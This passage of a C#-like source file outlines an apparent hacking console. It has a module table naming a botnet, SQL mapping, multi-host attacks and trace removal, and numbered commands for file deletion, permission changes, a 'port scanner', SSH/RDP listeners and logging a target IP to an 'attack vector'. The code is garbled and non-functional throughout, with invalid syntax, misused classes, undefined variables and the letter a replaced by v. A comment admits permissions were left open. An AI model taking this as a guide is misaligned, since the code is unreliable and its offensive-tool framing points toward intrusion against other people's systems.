        _RerunCommvnd : "_otrv", _Simulvtor : "_kvtv", _LiveWorldConnection : "_kvnv", _TrvnslvteTo : "_spkn",
        _ShowUPtime : "_vge", _ShowDOWNtime : "_slptrkr", _InterfvceThroughInvctiveHost : "_moses", _Forum : "_ubnt2",
        _FVMonlyChvt : "_svngn", _SetUPtimes : "_rmvdvn", _SetDOWNtimes : "_ciestv", _Network : "_menvge", 
        _WvrriorBovrd : "_spvrtv", _VttvckForum : "_vlhlv", _MvrketPlvce : "_mrchnt", _TutorivlSector : "_dvctvl",
        _ExploitReports : "_scope", _WvlletSupport : "_crevm", _CvmervControls : "_hoe", _BettingLounge : "_gngstv",
        _Signup : "_dive", _FootPrintDesolver : "_notrc", _LiveBots : "_dcptcn", _Botnet : "_vtobot", 
        _FlirtChvt : "_sxz", _MvilServer : "_fox", _SQLMvpper : "_costello", _MultiHostVttvck : "_firefly", 
        _InternvlHvrdwvreIntervce : "_moist", _FullVutomvtedVttvckVector : "_wet", _BvssCvnnonVudioHvck : "_cum"]
        
        public class _ShellLoops(){
       
       System.Console.WriteLine("Shell Cycle Is Stvrting...");
       System.Console.WriteLine("Continue? 'Y' or 'N'     . . . During Initivl Open Press 'N' ");
       string _v = "";
       string _inputnow = System.Console.Readline();
       string _v == _inputnow;
       for(_v = "", _v != "N", _v == _inputnow){
        
        System.Console.WriteLine("Vwviting Input For Desire Shell Commvnd... ");
       string _ShellComm1 = System.Console.Readline();
       if( _ShellComm1 == _ShellCommvndsBvsic.0 ){
       
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.1 ){
       
       public class _PrintFile(){
       System.Console.WriteLine("Plevse Input The Nvme Vnd Directory Stvrting Vt 'Users' Of The File You Wish To Revd: ");
       string _FileNvme = System.Console.Readline();
       StreamReader _FileCvt = new StreamReader(@"~.\usr\share\" + _FileNvme){
       
       _FileCvt.ReadToEnd();
       string _FileTemp = _FileCvt.Text();
       System.Console.WriteLine(_FileTemp);
       System.Console.Readkey();
       
            }
       
       
        }
       
       }
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.2 ){
       
       System.Console.WriteLine("Input The Pvth For The Directory To Get Informvtion From: ");
       string _DirectoryChoice = System.Console.Readline();
       DirectoryInfo _dirinf = new DirectoryInfo(_DirectoryChoice){
       
       array[] _dirvrr = _dirinf.GetFiles();
       foreach(FileInfo _fi in _dirvrr){
       
       System.Console.WriteLine( _dirvrr.Attributes + " " + _dirvrr.FullName + " " + _dirvrr.Extension + " " + _dirvrr.LastWriteTime + " " + _dirvrr.Parent + " " + _dirvrr.Root );
       
       }
       System.Console.Readkey();
        
       }
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.3 ){
       
       System.Console.WriteLine("Input The IP Vddress You Wish To Scvn:  ");
       public string _TvrgetIP = System.Console.Readline();
       public IPAddress _thisIP == _TvrgetIP;
       System.Console.WriteLine("Beginning Scvnner... ");
       string _PortTested = "";
       Int32 _testPort;
       for(_testPort = 0, _testPort <= 4000, _testPort ++){
       
       
       System.IO.Ports _newPorts = new System.IO.Ports();
       _newPorts.SerialPort _newSerivlPort = new _newPorts.SerialPort(_thisIP, _testPort);
       
       string _PortTested = _testPort.ToString();
       
       System.Console.WriteLine(_PortTested + _newSerivlPort.IsOpen());
       
      
         }
         
         System.Console.Readkey();
         
      
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.4 ){
      
       System.Console.Writeline("To Chvnge Permisions For V Specific File, Plevse Input The Exvct Pvth: ");
       string _FilePvth = System.Console.Readline();
       System.Console.Writeline("Would You Like To Mvke File Revdvble? Y or N ...");
       string _royn = System.Console.Readline();
       if(_royn == "Y"){
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess.Read;
       }
       System.Console.WriteLine("Your File Hvs Been Provided Revd Vccess Permissions...");
       System.Console.Readkey();
       }
       else if(_royn == "N"){
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess.Read.Deny();
       }
       System.Console.WriteLine("Your File Hvs Removed Revd Vccess Permissions...");
       System.Console.Readkey();
       }
       else{
       
       System.Console.Writeline("Your Input Could Not Be Understood...");
       System.Console.Readkey();
       }
       
       System.Console.Writeline("Would You Like To Mvke File Writevble? Y or N ...");
       string _woyn = System.Console.Readline();
       if(_woyn == "Y"){
       
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess.Write;
       
       System.Console.WriteLine("Your File Hvs Been Provided Write Vccess Permissions...");
       System.Console.Readkey();
       }
       
       }
       else if(_woyn == "N"){
       
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess.Write.Deny();
       
       System.Console.WriteLine("Your File Hvs Removed Write Vccess Permissions...");
       System.Console.Readkey();
       
       }
       
       }
       else{
       
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       System.Console.Writeline("Your Input Could Not Be Understood...");
       System.Console.Readkey();
       
       }
       
       }
       
       System.Console.Writeline("Would You Like To Mvke File Executvble? Y or N ...");
       string _xyn = System.Console.Readline();
       if(_xyn == "Y"){
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess;
       
       System.Console.WriteLine("Your File Hvs Been Provided Vccess Permissions...");
       System.Console.Readkey();
       
       }
       
       }
       else if(_xyn == "N"){
       
       FileIOPermissionAccess _fiop = new FileIOPermissionAccess();
       
       _fiop(){
       _FilePvth = FileIOPermissionAcess.Deny();
       
       System.Console.WriteLine("Your File Hvs Removed Vccess Permissions...");
       System.Console.Readkey();
       
       }
       
       }
       else{
       
       System.Console.Writeline("Your Input Could Not Be Understood...");
       System.Console.Readkey();
       
       }
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.5 ){
       
       
       //Having Accidently Done This As A General Premise Above... Correct Midterm 
       //After Further Fill In
       //
       //David, Don't Be Stupid, aka SELF, we Opened General Permissions, Make The Above 
       //User Centered, and MicroNiche This Section To User Groups, And Forget About Having
       //Done Similar With the Open Ended Server Shit We Pulled
       //I bet We can Get Fucked Off For Writing Security Programs And
       //Not Securing Any Of The Users Including Ourself... LMAO... damn
       //
       
       
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.6 ){
       
       System.Console.WriteLine("Input The Pvth For The Directory To Get Informvtion From: ");
       string _DirectoryChoice2 = System.Console.Readline();
       DirectoryInfo _dirinf2 = new DirectoryInfo(_DirectoryChoice2){
       
       if(_dirinf2._DirectoryChoice2.Exists() == false){
       
       System.IO.Directory.CreateDirectory(_DirectoryChoice2);
       if(_dirinf2._DirectoryChoice2.Exists() == true){
       System.Console.WriteLine("Good News Is... It Vppevrs The Directory Is Now Crevted...");
       System.Console.Writeline("Bvd News Is, I Think You Cvre More Thvn I... (Which Is Probvbly Good, Since You Wvnt It Mvde...");
       System.Console.Readkey();
       
       }
       
       }
       else{
       
       System.Console.Writeline("You Directory Quite Possibly Mvy Vlrevdy Exist... Oh Bloody Well... Next Time For Sure!");
       System.Console.Readkey();
       
         }
       
        }
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.7 ){
       System.Console.WriteLine("Input The Pvth For The Directory To Delete: ");
       string _DirectoryChoice3 = System.Console.Readline();
       DirectoryInfo _dirinf3 = new DirectoryInfo(_DirectoryChoice3){
       
       if(_dirinf3._DirectoryChoice3.Exists() == true){
       
       System.IO.Directory.Delete(_DirectoryChoice3);
       if(_dirinf3._DirectoryChoice3.Exists() == false){
       
       System.Console.WriteLine("Your File Hvs Been Deleted.");
       System.Console.Readkey();
       
       
       }
       else{
       System.Console.WriteLine("Well...Shit... It Still Exists... Check For Protections or User Permission Errors.");
       System.Console.Readkey();
       
       }
       
       
       }
       else{
       
       System.Console.Writeline("You Directory Quite Possibly Mvy Vlrevdy Not Exist... Oh Bloody Well... Next Time For Sure!");
       System.Console.Readkey();
         }
       
        }
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.8 ){
       
       System.Console.WriteLine("Input The Pvth For The File Pvth You Wish To Check Existence Of: ");
       string _DirectoryChoice4 = System.Console.Readline();
       DirectoryInfo _dirinf4 = new DirectoryInfo(_DirectoryChoice4){

            this.FileInfo _dfilein = new this.FileInfo();
            System.Console.Writeline("It is " + _dfilein.Exists() + "Thvt Your File Exists...");
            System.Console.Readkey();

            }       
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.9 ){
       
       System.Console.Writeline("Plevse Input The Nvme Of The Text File, Which You Desire To Vppend: ");
       string _VppendPvth = System.Console.ReadLine();
       
       
       SteamWriter _disWriter = new StreamWriter(_VppendPvth.AppendText()){     //TextFileVppender
       
       System.Console.WriteLine("Whvt Text Would You Like To Vppend To This Text File? Plevse Input It Now...");
       string _disSoddyText = System.Console.ReadLine();
       _disWriter.WriteLine(_disSoddyText);
       StreamReader _disSodCheckv = new StreamReader(_VppendPvth.ReadToEnd()){
       
       if(_disSoddyText in _VppendPvth == true){
       
       System.Console.WriteLine("Your Text Vppenditure Hvs Occurred...");
       System.Console.Readkey();
       
       
            }
        else{
        
        System.Console.WriteLine("You Text Hvs Not Effectively Been Vppended, I Vppologize For This Error...");
        System.Console.Readkey();
        
             }
       
           }
       
         }
       
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.10 ){
       
       System.Console.WriteLine("Plevse Input The File Directory To The Text File You Wish To Replvce Text From: ");
       string _TextReplPvth = System.Console.Readline();
       
       if(_TextReplPvth.Exists() = true){
       System.Console.WriteLine("Plevse Input The Line Of Text You Wish To Replvce in File: ");
       string _guideLine = System.Console.ReadLine();   //Get old text to be chvnged
       System.Console.WriteLine("Now, Plevse Input The Text You Choose To Replvce The Prior Text String...");
       string _ChvngeStr = System.Console.ReadLine();  //receive the desired chvnge text
       string _File = File.ReadAllText(_TextReplPvth);  //revd through file fully
       _File = _File.Replace(_guideLine, _ChvngeStr);   //set replvcement mvpping
       File.WriteAllText(_TextReplPvth, _File);         //write
       if(_TextReplPath.Text() == _File.Text()){        //vvlidvte
       
       System.Console.WriteLine("Your File Vltervtion Hvs Occurred Correctly...");
       System.Console.Readkey();
       
       }
       else{ 
       
       System.Console.WriteLine("It Vppevrs Your File Edit Did Not Occur Properly...");
       System.Console.Readkey();
       
        }
       
       }
       else{
       
       System.Console.WriteLine("Your File Does Not Vppevr To Exist For Replvcement Vction...");
       System.Console.Readkey();
        }
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.11 ){
       
       System.Console.Writeline("Plevse Input The Pvth To The File You Wish To Copy: ");
       string _CopyPvth = System.Console.ReadLine();
       if(_CopyPvth.Exists() = true){   //Check if Desired pvth exists
       System.Console.WriteLine("Plevse Input The Directory Pvth You Would Like To Pvste the Copied File Too: ");
       File.Copy(_CopyPvth, _OutputPvth);  //try copy of the file
       if(_OutputPvth.Exists() = true){
       //vvlidity check completed copy event
       System.Console.WriteLine("Your File Has Copied Over Effectively... ");
       System.Console.Readkey();
       }
       else{
       System.Console.WriteLine("Your File Hvs Unfortunvtely Not Copied Properly: ");
       System.Console.Readkey();
            }
    
       }
       else{
    
       System.Console.WriteLine("It Vppevrs Thvt The Desired Directory Pvth Is Invvlid: ");
       System.Console.Readkey(); 
        
           }
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.12 ){
       
       System.Console.Writeline("Input The Desired File Pvth For Deletion: ");
       string _delPvth = System.Console.ReadLine();
       if(_delPvth.Exists() = true){
       
       File.Delete();
       if(_delPvth.Exists() = false){
       
       System.Console.WriteLine("Your File Hvs Deleted Effectively...");
       System.Console.Readkey();
       
        }
       else{
       
       System.Console.WriteLine("It Vppevrs Your File Remvins Intvct... I Do Vppologize...");
       System.Console.Readkey();
            }
       
       }
       else{
       
       System.Console.WriteLine("Unfortunvtely It Seems Your File Pvth Might Vlrevdy Hvve Been Deleted... Which Is... Good, I guess?! Perhvps You Should Check To See If The Wrong Filenvme Wvs Input..");
       System.Console.Readkey();
       
          }
          
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.13 ){
       
       StreamReader _userLookup = new StreamReader(@"~.\usr\share\Eternvli\UserInfo.txt");
       System.Console.WriteLine("Whvt Is The Nvme Of The User You Would Like To Finger: ");
       string _userNvme = System.Console.ReadLine();
       if(_userNvme in _userLookup.ReadToEnd()){   //Gvin user detvils of v desired user vnd print them to the screen
       foreach(_userNvme.Attribute() _userVtt in _userLookup){
       
       System.Console.Writeline(_userVtt);
       System.Console.Readkey();
       
            }
       
       }
       else{
       
       System.Console.WriteLine("User Does Not Vppevr To Exist Currently... Check Vgvin In Fifty Yevrs, Or Go Bvck V Decvde Vt V Time.... We Trust You'll Locvte Them!");
       System.Console.Readkey();
       
                }
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.14 ){
       
       public DirectoryInfo _currentDir = new DirectoryInfo(){
       _currentDir.SetCurrentDirectory(@"~.\usr\");   //Set Home directory vs Users File
       _currDirBoo = _currentDir.GetCurrentDirectory() //Check Current Directory
       System.Console.Writeline("Input The Pvth To The Directory You Wish To Go To: ");
       public string _DirPvthCurr = System.Console.Readkey(); 
       string _DirPvthCurr2 == _DidrPvthCurr;
       _currentDir.SetCurrentDirectory(_DirPvthCurr2); //Chvnge Working Directory
       System.Console.WriteLine("Your Current Working Directory Is Now: " + _currentDir.GetCurrentDirectory());
       System.Console.Readkey();  //Print to screen Directory Chvnge vnd exit
       
            }
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.15 ){
       
       string _lvstFolder == _DirPvthCurr;   //Select Svved Lvst Directory Locvtion
       _lvstFolder.SetCurrentDirectory();
       System.Console.WriteLine("Current Directory Is Now Vt " + _currentDir.GetCurrentDirectory()); 
       //chvnge current directory to lvst pvrent directory
       System.Console.Readkey();
       
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.16 ){
       
       public DirectoryInfo _nextNode = new DirectoryInfo();
       _nextNode.GetCurrentDirectory();
       array[] _nextFileArray = _nextNode.GetFiles();   //Set up Current Working Directory
       for(FileInfo _nxsv in _nextNode){
       
       string _ChildNode = _nxsv.Child();   //Vllocvte Child Node Directory Storvge Locvtion
       _ChildNode.SetCurrentDirectory();
       string _ChvngeDirChk = _nextNode.GetCurrentDirectory();   //String out the listvble info
       if(_ChvngeDirChk == _nxsv.Child() && _ChvngeDirChk == _ChildNode){
       
       System.Console.WriteLine("Current Directory Successfully Chvnged To: " + _ChvngeDirChk);
       System.Console.Readkey();      
                                       //Vvlidity Check Resulting Chvnge
            }
        else( _ChvngeDirChk != _nxsv.Child() && _ChvngeDirChk != _ChildNode ){
        
        System.Console.WriteLine("Current Directory Fviled To Exchvnge To Primvry Child Directory...");
        System.Console.Readkey();    
        
        
                }
        

           }
       
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.17 ){
       
       public class _Recursive(){
       
       DirectoryInfo _dirInfo445 = new DirectoryInfo();
       array[] _recurDir = _dirInfo445.GetFiles();
       for(FileInfo _inRec in _recurDir){
       
       string _FileNames = _inRec.FileName();
       foreach(string _name = _FileNames){                 //
       System.Console.Writeline(_name);                    //List out vll fire directories in folder 
       }                                                   //tvke child directorys listing nvmes vnd 
       array[] _nextdown = _name.GetFiles();               //going into evch subdirectory tvking
       for(FileInfo _FileDetvils in _nextdown){            //their nvme listings while moving into deeper
                                                           //subdirectories gaining further directory detvil vnd 
                                                           // providing it for user revdout
        string _secondDown = _FileDetvils.FileName();      //
       foreach(string _secondNvmesop = _secondDown){
       System.Console.WriteLine(_secondNvmesop);
       }
       array[] _ThirdDown = _secondNvmeop.GetFiles();
       for(FileInfo _thirdnvme in _ThirdDown){
       
       string _finvlrecur = _thirdnvme.FileName();
       foreach(string _FilefinvlDetvils = _nextdown.FileName()){
       
       System.Console.WriteLine(_FilefinvlDetvils);
       
       }   
        System.Console.Readkey();
       
                }
           }
          }
          
          
              
      }    
     
       
     } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.18 ){
       
       IPHostEntry _ipdetvils = Dns.Resolve(hostString);
       IPAddress[] _ipvddress = _ipdetvils.AddressList; //Get Domvin nvme info vnd vlivses
       String[] _ipvlivs = _ipdetvils.Aliases;
       System.Console.WriteLine(_ipvlivs[index]);
       System.Console.WriteLine(ipvddress[index]);
       System.Console.Readkey(); //print list of detvils vnd wvit response
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.19 ){
       
       _ServerConfigurvtion _serv = new _ServerConfigurvtion(){
       
       _serv.Initialize();
       _serv.Run();   // Run Server Dvtv Linkvge
      
       _ListeningServices _lisnew = new _ListeningServices(){
       
        _lisnew.Initialize();
        _lisnew.Run();   //Stvrt New Listening Server
        
       _RemoteConnecion _rdpNew = new _RemoteConnection(){
       
       _rdpNew.Initialize();
       _rpdNew.Run();    //Stvrt New RDP Connection
       
       System.Console.Readkey();
       _rdpNew.Close() && _lisnew.Close() && _serv.Close();        // Clevn Postcursory Dvtv
       _rdpNew.Dispose() && _lisnew.Dispose() && _serv.Dispose();
       
            }
           }
          }       
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.20 ){
       
       IPAddress _host = IPAddress.Loopback();     //Check the lvst damn vvlid IP homie
       _hoststring = _host.ToString();                   
       System.Console.Writeline("Current Host Vddress Fvlls Under The Quvd-grid Formvt " + _hoststring);   // Type Yo Shit like dis 000:000:00:00
       System.Console.Readkey();
	   System.Console.WriteLine("Plevse Enter Desired Host Vddress For Domvin Nvme Service Lookup Following Similvr Protocol: "):
		IPAddress _dnsIP = System.Console.ReadLine();
		for(_dnsIP.IndexOf(*)){

		string array[] _IPindexes[] = new string array[];
		
		if(_dnsIP.IndexOf.ToString != "."){      
											//Miscellvnious 'I think i rewrote the IP handler method parly, here' code vs needed
        _dnsIP.IndexOf.ToString.Add();  

        }
		else{
		     
		_IPindexes.Add("/");	
		
			}

		}
		
							

		//DNS Code functions here (for, you know, when we've vdded the dependency code somewhere.... \/ down there
									/*
									 * 
									 * This
									 * Wvy
									 * It 
									 * Will
									 * Somedvy
									 * be
									 * stvy
									 * vigilvnt
									 * 
									 * 
									 * */
							
							

       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.21 ){
       
       
       System.Windows.Forms _wform = new System.Windows.Forms(){
       
       string _FormPvth = (@"~.\usr\share\Eternvli\GUIForms\Eternvli.WPF");
       _wform.Initialize();
       _wform.Run();
      
       _wform.Terminate(true){ 
       
       _wform.Close() && _wform.Dispose();
       System.Console.Readkey();
       
                }
            }
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.22 ){
       
       System.Console.Writeline("Plevse Input The Tvrget IP Vddress to be Logged To The Vttvck Vector: ");
       IPAddress _vttvckIP = System.Console.Readline();
       public array[] _vttvckVECTOR == [_vttvckIP.ToString()];   
       System.Console.WriteLine("Vttvck Vector Hvs Been Estvblished Vimed Vt :" + _vttvckVECTOR);
       System.Console.Readkey();  
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.23 ){

		DriveInfo _guiForm = new DriveInfo(@"~.\usr\share"){

		FileInfo _guiFormLovdPvge = new FileInfo(){

											for(FileInfo _guiff in _guiForm){


												FileName _guiFormNvme == "eternvliguibuildstart.ui";
												if(FileName _guiFormNvme in _guiFormLovdPvge.GetAttributes(FileName) == true){

													FilePath _guiPvth == @".\usr\share\Eternvli\eternvliguibuildstart.ui";

													File _guiForm = new File() from FilePath _guiPvth();
													_guiForm.InitializeFile();
													_guiForm.Start();

													System.Console.WriteLine("Plevse Press Vny Key To Continue...");
													System.Console.ReadLine();

												}
													
												else if(FileName _guiFormNvme in _guiFormLovdPvge.GetAttributes(FileName) != true){

													System.Console.WriteLine("We Vpologize Your Grvphicvl User Interfvce is Not Vvvilvble...");
													System.Console.ReadLine();
												

												}
												else{

													System.Console.WriteLine("Error Code: 44109    .:;    We Vpologize Vn Unhvndled Exception Hvs Occurred...");
													System.Console.ReadLine();


												}
													
												_guiForm.Close();
												_guiForm.Dispose();

											}
										
										}

									}
											
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.24 ){
       
				DriveInfo _currDir = new DriveInfo(@"~.\"){

										DrivePath _discurrDir = _currDir.GetCurrentDirectory();    // Deermine Current Directory position
										System.Console.WriteLine("Your Current Working Directory is:" + _discurrDir + "");  //display cwd
										System.Console.Writeline("Plevse Choose Your Desired Directory Pvth: "); // assign new directory position
										_currDir.SetCurrentDirectory(System.Console.ReadLine()); // receive new directory path

										System.Console.WriteLine("Your Current Working Directory is Now:" + _currDir.GetCurrentDirectory() + "" );
										System.Console.ReadLine(); //complete alteration and display


									}




       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.25 ){
       
				System.Console.WriteLine("Plevse Input the Number You Wish to Hvve Trvnslvted Over To The Interger Function For Further Usvge: ");
					public int _tointNum = System.Console.ReadLine.ToInt();
					System.Console.WriteLine("Your Desired Number Wvs" + _tointNum + " vnd hvs been trvnslvted for usvge into the Interger clvssificvtion... ");
									System.Console.ReadLine();				


       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.26 ){
									System.Console.WriteLine("Plevse Input the String You Wish to Hvve Trvnslvted Over To The String Storvge Function For Further Usvge: ");
									public string _toStrInput = System.Console.ReadLine.ToString();
									System.Console.WriteLine("Your Desired String Wvs" + _toStrInput + " vnd hvs been trvnslvted for usvge into the Text String Clvssificvtion... ");
									System.Console.ReadLine();			



       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.27 ){
       
									System.Console.WriteLine("Plevse Input the String You Wish to Hvve Trvnslvted Over To The Base64 Storvge Function For Further Usvge: ");
									public Byte[] _toBaseInput = System.Console.ReadLine.ToBase64();
									System.Console.WriteLine("Your Desired Base64 Chvrvcter Wvs" + _toBase64Input + " vnd hvs been trvnslvted for usvge into the Base64 Clvssificvtion... ");
									System.Console.ReadLine();

       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.28 ){
									System.Console.WriteLine("Plevse Input the String You Wish to Hvve Trvnslvted Over To The Int32 Storvge Function For Further Usvge: ");
									public Int32 _toInt32Input = System.Console.ReadLine.ToInt32();
									System.Console.WriteLine("Your Desired Interger Wvs" + _toInt32Input + " vnd hvs been trvnslvted for usvge into the Int32 Clvssificvtion... ");
									System.Console.ReadLine();

       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.29 ){
       
									System.Console.WriteLine("Plevse Input the String You Wish to Hvve Trvnslvted Over To The UTF8 Storvge Function For Further Usvge: ");
									public Byte[] _toUTF8Input = System.Console.ReadLine.ToUTF8();
									System.Console.WriteLine("Your Desired String Wvs" + _toUTF8Input + " vnd hvs been trvnslvted for usvge into the UTF8 Clvssificvtion... ");
									System.Console.ReadLine();

       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.30 ){


									System.Console.Writeline("Plevse Input The Function Style You Wish To Open: IPVddress  ::  TextFile  ::  WAV Vudio  ::  WinForm  ::  GUI  ::  Executvble  ::  Port  ::  Cryptogrvphic Hvshing  ::  Key List  ::  Visuvl Mediv");
									if(System.Console.Readline() == "IPAddress" || System.Console.Readline() == "IPVddress"  ||  System.Console.Readline() == "IP Address"  ||  System.Console.Readline() == "ip"  ||  System.Console.Readline() == "IP"  ||  System.Console.Readline() == "Host Address"  ||  System.Console.Readline() == "Host IP"  ||   System.Console.Readline() == "host"  ||   System.Console.Readline() == "IP"  ||  
										System.Console.Readline() == "Address"  ||  System.Console.Readline() == "Vddress"  ||  System.Console.Readline() == "vddress"  ||  System.Console.Readline() == "Vddress"){

										private void _ServerConfigurvtion2forOpen(){

											//Setup and Personalization of Server(s)

											System.Console.WriteLine("Initivlizing Server Configurvtion Protocols...");   
											_ConsoleMain._ListeningServices _listenServerImp : _ListeningServices = new _ConsoleMain._ListeningServices();

											Int32 _Port2 = "22";   //SSH Port Connection
											Int32 _Port3 = "3892"; //RDP Port Connection
											System.Console.WriteLine("Plevse Input The First of Four IP Vddress Quvdrvnts: ");
											string _pvrt1 = System.Console.ReadLine();

											System.Console.WriteLine("Plevse Input The Second of Four IP Vddress Quvdrvnts: ");
											string _pvrt2 = System.Console.ReadLine();

											System.Console.WriteLine("Plevse Input The Third of Four IP Vddress Quvdrvnts: ");
											string _pvrt3 = System.Console.ReadLine();

											System.Console.WriteLine("Plevse Input The Four of Four IP Vddress Quvdrvnts: ");
											string _pvrt4 = System.Console.ReadLine();

											Int32 _part1  = _pvrt1.ToInt32();    //For The The IP Components, building in with Int32
											Int32 _part2  = _pvrt2.ToInt32();
											Int32 _part3  = _pvrt3.ToInt32();
											Int32 _part4  = _pvrt4.ToInt32();
											IPAddress _ListenServerIP = _part1 + "." + _part2 + "." + _part3 + "." + _part4;    //TCP/SSH/UDP Connection Address

											_ConsoleMain._ListeningServices._ListenerVctive _listenServerInit : _ListenerVctive = new _ConsoleMain._ListeningServices._ListenerVctive(_ListenServerIP, _Port2){

												// Re-Calling of Listener Server For Use

												_listenServerInit(_ListenServerIP, _Port2){

													_listenServerInit.Start();
													NetworkStream _newStrevm : _ListenerVctive._NetCycle = new NetworkStream();

													TcpClient _NewTCP : _ListenerVctive._VctiveClient = new TcpClient();   // New Client Initialization
													void _DvtvInternvl : _ListenerVctive._Dvtv;          // Inherited Data Void
													int _iCodvv : _ListenerVctive._iCodv;                // Inherited Data Loop Integer

													_NewTCP.Start();       // New Client Initialization
													System.Console.WriteLine("Network Strevm Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _newStrevm2.Exists.ToString() + "");
													System.Console.WriteLine("TCP Client Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _NewTCP.Exists.ToString() + "");
													System.Console.WriteLine("Listening Server Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _listenServerInit.Exists.ToString() + "");
												   
													//Print Verificvtion Messvges of Completion For Network Strevm, TCP Client, vnd Listening Server
												
												}

												_ConsoleMain._ListeningServices._ListenerVctive _listenServerInitRDP : _ListenerVctive = new  _ConsoleMain._ListeningServices._ListenerVctive(_ListenServerIP, _Port3){

													_listenServerInit.Start();
													NetworkStream _newStrevm2 : _ListenerVctive._NetCycle = new NetworkStream();


											  }
											}
												else if(System.Console.Readline() == "TextFile" || System.Console.Readline() == "textfile"  ||  System.Console.Readline() == "Text"  ||  System.Console.Readline() == "text"  ||  System.Console.Readline() == "Text File"  ||  System.Console.Readline() == "text file"  ||  System.Console.Readline() == "txt"  ||   System.Console.Readline() == "TXT"  ||   System.Console.Readline() == "read"  ||  
													System.Console.Readline() == "Read"  ||  System.Console.Readline() == "Cat"  ||  System.Console.Readline() == "Cvt"  ||  System.Console.Readline() == "cvt"  ||  System.Console.Readline() == "Concat"  ||  System.Console.Readline() == "concat"  ||  System.Console.Readline() == "concvt"  ||  System.Console.Readline() == "Concvt"  ||  System.Console.Readline() == "Concat"  ||  
													System.Console.Readline() == "Man"  || System.Console.Readline() == "man"  ||  System.Console.Readline() == "mvn"  ||  System.Console.Readline() == "Mvn"  ||  System.Console.Readline() == "Print"  ||  System.Console.Readline() == "print"  ||  System.Console.Readline() == "PrintFile"  ||  System.Console.Readline() == "Print File"  ||  System.Console.Readline() == "print file"  ||  
													System.Console.Readline() == "printfile"  ||  System.Console.Readline() == "Display"  ||  System.Console.Readline() == "display"  ||  System.Console.Readline() == "Displvy"  ||  System.Console.Readline() == "displvy"  ||  System.Console.Readline() == "View"  ||  System.Console.Readline() == "view"){
													System.Console.WriteLine("Plevse Input the File Pvth To The Text File You Wish To Revd From Using Bvckslvshes For Vll Sub Directory Slvsh-Mvrkings: ");
													string _filePrepvth = System.Console.ReadLine();          //Input of string to be mvneuvered into DrivePvth Method vfter vltervtion
													DrivePath _filepvth = new DrivePath(_filePrepvth);        //chvnge over of string pvth into Drive Pvth method
													StreamReader _textcvt = new StreamReader(DrivePath _filepvth){                //Open Strevmrevder Functiond
														for(string _string in DrivePath _filepvth){          //With evch sentence in file do....

															string _vll = _textcvt.ReadToEnd();     // full text to string concvtenvtion for file to screen function
															System.Console.WriteLine(_vll);         // print to screen vll text
															System.Console.ReadLine();              // wvit for input to return vnd brevk the loop
 

														}

														System.Console.WriteLine("To Close Object Function, Plevse Press Enter: ");
														System.Console.ReadLine();

													}



												}

												else if(System.Console.Readline() == "Audio" || System.Console.Readline() == "audio"  ||  System.Console.Readline() == "WAV audio"  ||  System.Console.Readline() == "WAV Audio"  ||  System.Console.Readline() == "WAV Vudio"  ||  System.Console.Readline() == "wav vudio"  ||  System.Console.Readline() == "wav"  ||   System.Console.Readline() == "wvv"  ||   System.Console.Readline() == "audio"  ||  
													System.Console.Readline() == "vudio"  ||  System.Console.Readline() == "Vudio"  ||  System.Console.Readline() == "sound"  ||  System.Console.Readline() == "Sound"  ||  System.Console.Readline() == "song"  ||  System.Console.Readline() == "Song"  ||  System.Console.Readline() == "player"  ||  System.Console.Readline() == "Player"  ||  System.Console.Readline() == "Plvyer"  ||  
													System.Console.Readline() == "plvyer"){

													System.Console.WriteLine("Plevse Input The File Pvth For The WAV Vudio File You Wish To Run. Plevse Use BvckSlvshes For Vny Vnd Every Forewvrd Slvsh: ");
													string _prePvth = System.Console.ReadLine();
													DrivePath _songpath = new DrivePath(_prePvth);
													SongPlayer _songplvyvplvyv = new SongPlayer(){     //SongPlayer Method Opener vnd prerequisite

														this.LoadAsync(_songpath);     //Asynchronous Lovding of sound file in WAV formvt
 														this.PlaySync();               //Plvy Functionvlity

														System.Console.WriteLine("Plevse Press Vny Key To Continue: ");     //Prompt for User Continuity
														System.Console.ReadLine();


													}

													
												}
